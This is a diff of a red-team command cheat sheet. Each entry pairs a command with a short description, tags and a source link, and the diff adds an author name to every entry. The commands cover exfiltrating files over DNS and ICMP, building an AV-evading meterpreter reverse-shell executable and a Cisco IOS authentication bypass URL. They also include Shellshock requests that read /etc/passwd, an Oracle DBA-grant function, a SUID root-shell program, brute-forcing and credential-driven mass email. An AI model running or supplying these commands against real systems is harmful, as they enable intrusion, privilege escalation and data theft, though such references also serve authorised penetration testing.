@@ -3414,6 +3784,7 @@ https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/
 EOR
 enable
 raise privs cisco
+Innes
 EOC
 cisco
 EOT
@@ -3421,6 +3792,7 @@ http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r
 EOR
 conf t
 start configuration
+Innes
 EOC
 cisco
 EOT
@@ -3428,6 +3800,7 @@ http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r
 EOR
 show session
 show sessions
+Innes
 EOC
 cisco
 EOT
@@ -3435,6 +3808,7 @@ http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r
 EOR
 show version
 show version
+Innes
 EOC
 cisco
 EOT
@@ -3442,6 +3816,7 @@ http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r
 EOR
 show running-config
 show the config which is running in flash, looking for password 7 and the like
+Innes
 EOC
 cisco
 EOT
@@ -3449,6 +3824,7 @@ http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r
 EOR
 show startup-config
 show the config which runs on start up
+Innes
 EOC
 cisco
 EOT
@@ -3456,6 +3832,7 @@ http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r
 EOR
 show ip interface
 show interface information : add breif for less
+Innes
 EOC
 cisco
 EOT
@@ -3463,6 +3840,7 @@ http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r
 EOR
 show ip route
 show the routes of the switch
+Innes
 EOC
 cisco
 EOT
@@ -3470,6 +3848,7 @@ http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r
 EOR
 show access-lists
 show the ACL for the switch
+Innes
 EOC
 cisco
 EOT
@@ -3477,6 +3856,7 @@ http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r
 EOR
 http://[ip]/level/56/exec/show/config
 Bypass auth on ios 11.2-12.2
+Innes
 EOC
 cisco
 interesting
@@ -3487,6 +3867,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 file2cable -i eth0 -f [file]
 replay packets to network
+Innes
 EOC
 Linux
 networking
@@ -3496,6 +3877,7 @@ http://manpages.ubuntu.com/manpages/xenial/man1/file2cable.1.html
 EOR
 dnsrecon -t rvs -i 10.0.0.1,10.0.0.255
 Reverse look up on range
+Innes
 EOC
 Linux
 scanning
@@ -3505,6 +3887,7 @@ https://github.com/darkoperator/dnsrecon
 EOR
 dnsrecon -t std -d [domain]
 brute names
+Innes
 EOC
 Linux
 scanning
@@ -3514,6 +3897,7 @@ https://github.com/darkoperator/dnsrecon
 EOR
 dnsrecon -t axfr -d [domain]
 do a zone transfer request (just use host . . .)
+Innes
 EOC
 Linux
 networking
@@ -3524,6 +3908,7 @@ https://github.com/darkoperator/dnsrecon
 EOR
 ftp -s ftp.txt
 uninteractive FTP, read commands from file
+Innes
 EOC
 Windows
 Files
@@ -3533,6 +3918,7 @@ https://technet.microsoft.com/en-gb/library/bb490910.aspx
 EOR
 for line in `base64 -w 230 [file]`; do host $line.[hostname]; done
 exfil file through DNS, may want to encrypt, also assuming you have a short domain
+Innes
 EOC
 Linux
 loop
@@ -3543,6 +3929,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 for a in {a..z}; do for b in {a..z}; do for c in {a..z}; do for d in {a..z}; do whois $a$b.$c$d; done; done;done;done
 look for a free short domain, good luck
+Innes
 EOC
 Linux
 loop
@@ -3553,6 +3940,7 @@ http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
 EOR
 for line in `base64 -w 1000 [file]`; do ping -s 1000 -c 1 -M do [ip]; done
 Exfil over icmp
+Innes
 EOC
 Linux
 loop
@@ -3563,6 +3951,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 fpipe.exe -l [lport] -r [rip] [ip]
 forward local traffic htting lport to [rip]:[rport]
+Innes
 EOC
 Windows
 networking
@@ -3573,6 +3962,7 @@ http://exploit.co.il/hacking/pivoting-into-a-network-using-plink-and-fpipe/
 EOR
 socat TCP4:LISTEN:[lport] TCP4:[rip]:[rport]
 forward local traffic htting lport to [rip]:[rport]
+Innes
 EOC
 Linux
 pivoting
@@ -3582,6 +3972,7 @@ https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/
 EOR
 for i in {1..65000}; do echo 1 > /dev/tcp/[ip]/$i; echo $i; done
 tcp port scanning from bash, just wireshark on the ip, useful if you have cmd execution on web app
+Innes
 EOC
 Linux
 loop
@@ -3594,6 +3985,7 @@ http://tldp.org/LDP/abs/html/devref1.html
 EOR
 ssh -o StrictHostKeyChecking=no -t -t -i [private_key] -R [lport]:[rhost]:[rip] [user]@[ip]
 ssh port forward [victim]:[port] to [ip]:[port], access by localhost:[port], rhost can be 127.0.0.1
+Innes
 EOC
 Linux
 networking
@@ -3602,7 +3994,8 @@ EOT
 https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to-bypass-nat/
 EOR
 plink.exe -N -i [private_key] -R [lport]:[rhost]:[rip] -l [user] [ip]
-ssh port forward [victim]:[port] to [ip]:[port], access by localhost:[port], rhost can be 127.0.0.1
+ssh port forward [victim]:[port] to [ip]:[port], access by localhost:[port], rhost can be 127.0.0.1. Privte key needs to be in putty format, a PPK
+Innes
 EOC
 Windows
 networking
@@ -3612,6 +4005,7 @@ http://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html
 EOR
 ssh -D [port] [user]@[ip]
 set up a socks proxy, proxycahins may help also
+Innes
 EOC
 Linux
 networking
@@ -3621,6 +4015,7 @@ https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to
 EOR
 msfvenom --payload windows/meterpreter/reverse_tcp --format exe --template calc.exe -k --encoder x86/shikata_ga_ni -i 5 LHOST=[lhost] LPORT=[lport] evil.exe
 create a evil calc
+Innes
 EOC
 metasploit
 av evasion
@@ -3629,6 +4024,7 @@ https://www.offensive-security.com/metasploit-unleashed/msfvenom/
 EOR
 ettercap -TP rand_flood
 try to make the switch fall over, and turn into a hub
+Innes
 EOC
 Linux
 MitM
@@ -3637,6 +4033,7 @@ https://linux.die.net/man/8/ettercap_plugins
 EOR
 hash lengths : MD5=16 | SHA1=20 | SHA256=32 | SHA512=64
 Hash byte lengths
+Innes
 EOC
 hashes
 reference
@@ -3645,6 +4042,7 @@ https://en.wikipedia.org/wiki/List_of_hash_functions
 EOR
 for i in *; do pdfinfo $i | egrep -i "Auth"; done  | sort
 generate user list from PDF's, you can get more info to such as pdf maker
+Innes
 EOC
 loop
 interesting
@@ -3656,6 +4054,7 @@ http://linuxcommand.org/man_pages/pdfinfo1.html
 EOR
 for i in `cat dets`; do echo "Sening Spam from $i"; mailx -s "Report Attached" -r "`echo $i | awk -F @ '{print $1}'`<`echo $i | awk -F : '{print $1}'`>" -a report.pdf -S smtp-auth=login -S smtp-auth-user="`echo $i | awk -F : '{print $1}'`" -S smtp-auth-password="` echo $i | awk -F : '{print $2}'`" -S ssl-verify=ignore -v -S smtp="10.11.1.229" [victim] < email;echo _________; done
 Loop around 'dets' (user:pass) and send an email through an authenticated mailserver with an attached file whos contents is stored in 'email'
+Innes
 EOC
 loop
 networking
@@ -3665,6 +4064,7 @@ http://www.binarytides.com/linux-mailx-command/
 EOR
 https://gchq.github.io/CyberChef/
 Common operations on data
+Innes
 EOC
 interesting
 reference
@@ -3674,6 +4074,7 @@ https://gchq.github.io/CyberChef/
 EOR
 schtasks /query /fo LIST /v
 List windows scheduled tasks, older windows defender
+Innes
 EOC
 Windows
 privilege escalation
@@ -3682,6 +4083,7 @@ http://www.fuzzysecurity.com/tutorials/16.html
 EOR
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 list installed patches on windows
+Innes
 EOC
 Windows
 privilege escalation
@@ -3691,6 +4093,7 @@ http://www.fuzzysecurity.com/tutorials/16.html
 EOR
 reg query [HKCU|HKLM]\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 Do MSI's have admin rights?
+Innes
 EOC
 Windows
 privilege escalation
@@ -3699,6 +4102,7 @@ http://www.fuzzysecurity.com/tutorials/16.html
 EOR
 echo %path%
 show the current path to see if we can subvert anything
+Innes
 EOC
 Windows
 privilege escalation
@@ -3707,6 +4111,7 @@ http://www.fuzzysecurity.com/tutorials/16.html
 EOR
 sc sdshow [service]
 Show service permissions, look for AU|AN|DU|LG, manual AccessChk, may help with bob ;)
+Innes
 EOC
 Windows
 privilege escalation
@@ -3715,6 +4120,7 @@ http://blogs.msmvps.com/erikr/2007/09/26/set-permissions-on-a-specific-service-w
 EOR
 nmblookup [name]
 Do a netbios name query.
+Innes
 EOC
 smb
 scanning
@@ -3724,6 +4130,7 @@ http://linuxcommand.org/man_pages/nmblookup1.html
 EOR
 export PS1="# \A:\[$(tput sgr0)\]\[\033[38;5;1m\]\u:\W:\[$(tput sgr0)\] "
 Pretty terminal PS1 that is copy n paste safe
+Innes
 EOC
 linux
 bash
@@ -3732,6 +4139,7 @@ http://bashrcgenerator.com/
 EOR
 apropos [keyword]
 search the manual page names and descriptions
+Innes
 EOC
 linux
 interesting
@@ -3740,6 +4148,7 @@ http://www.thegeekstuff.com/2009/11/5-methods-to-get-quick-help-on-linux-command
 EOR
 sntp [ip]
 Query the remote ntp time
+Innes
 EOC
 linux
 networking
@@ -3748,6 +4157,7 @@ http://doc.ntp.org/4.2.6/sntp.html
 EOR
 host -t axfr [ip]
 Ask for a zone transfer
+Innes
 EOC
 linux
 networking
@@ -3757,6 +4167,7 @@ https://tools.ietf.org/html/rfc5936
 EOR
 rusers -al [ip]
 show users rlogin
+Innes
 EOC
 enumeration
 linux
@@ -3765,6 +4176,7 @@ http://linuxcommand.org/man_pages/rusers1.html
 EOR
 net use z:\ \\[ip]\[share] /user:[domain]\[username] [password] /p:no [password]
 mount a share within windows
+Innes
 EOC
 windows
 smb
@@ -3773,6 +4185,7 @@ https://technet.microsoft.com/en-us/library/bb490717.aspx
 EOR
 samrdump.py -hashes [LMHASH:NTHASH] [user]:[pass]@[victim]
 List users of the remote system
+Innes
 EOC
 enumeration
 linux
@@ -3782,6 +4195,7 @@ https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
 EOR
 rlogin -l [user] [target]
 Login using rlogin : Not installed by default
+Innes
 EOC
 linux
 EOT
@@ -3789,6 +4203,7 @@ https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
 EOR
 finger @[ip]
 Show remote users using finger : Not installed by default? : use 0@[ip] for Solaris bug
+Innes
 EOC
 linux
 enumeration
@@ -3797,6 +4212,7 @@ https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
 EOR
 tnscmd10g version -h [victim]
 Fingerprint remote oracle server
+Innes
 EOC
 oracle
 enumeration
@@ -3806,6 +4222,7 @@ http://cyborg.ztrela.com/tnscmd10g.php/
 EOR
 CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid curren_user is pragma autonomous_transaction; begin execute immediate 'grant dba to user1 identified by pass1'; commit; return 'FOO'; end;
 Get Current user oracle DB : CMD new lines removed
+Innes
 EOC
 oracle
 enumeration
@@ -3814,6 +4231,7 @@ https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
 EOR
 ./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1
 Try to brute the remote group name : cisco
+Innes
 EOC
 scanning
 brute
@@ -3825,6 +4243,7 @@ https://www.trustwave.com/Resources/SpiderLabs-Blog/Cracking-IKE-Mission-Improba
 EOR
 sed -i 's/[[:space:]]*$//' [input]
 Remove trailing whitespace
+Innes
 EOC
 linux
 bash
@@ -3834,6 +4253,7 @@ http://ask.xmodulo.com/remove-trailing-whitespaces-linux.html
 EOR
 thc-pptp-bruter -u [username] -W -w /usr/share/wordlists/nmap.lst
 Brute force PPTP password
+Innes
 EOC
 brute
 scanning
@@ -3842,6 +4262,7 @@ https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
 EOR
 ./shocker.py -H TARGET  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
 NCC Shellshock tool
+Innes
 EOC
 linux
 EOT
@@ -3850,6 +4271,7 @@ git clone https://github.com/nccgroup/shocker
 EOR
 echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
 Shellshock Read File : Replace echo with anything you want
+Innes
 EOC
 linux
 EOT
@@ -3857,6 +4279,7 @@ https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
 EOR
 php -S 0.0.0.0:80
 PHP simple server
+Innes
 EOC
 pivoting
 interesting
@@ -3865,6 +4288,7 @@ https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
 EOR
 int main(void){setresuid(0, 0, 0);system("/bin/bash");}
 Simple SUID program  
+Innes
 EOC
 linux
 privilege escalation
@@ -3873,6 +4297,7 @@ https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
 EOR
 perl -e 'exec "/bin/bash";'
 perl spawn bash
+Innes
 EOC
 perl
 shell
@@ -3882,6 +4307,7 @@ https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
 EOR
 python -c 'import pty;pty.spawn("/bin/bash")'
 python spawn bash
+Innes
 EOC
 python
 shell
@@ -3891,6 +4317,7 @@ https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
 EOR
 !bash
 Call a shell from a number of programs, VIM, Nmap FTP SFTP etc
+Innes
 EOC
 linux
 shell
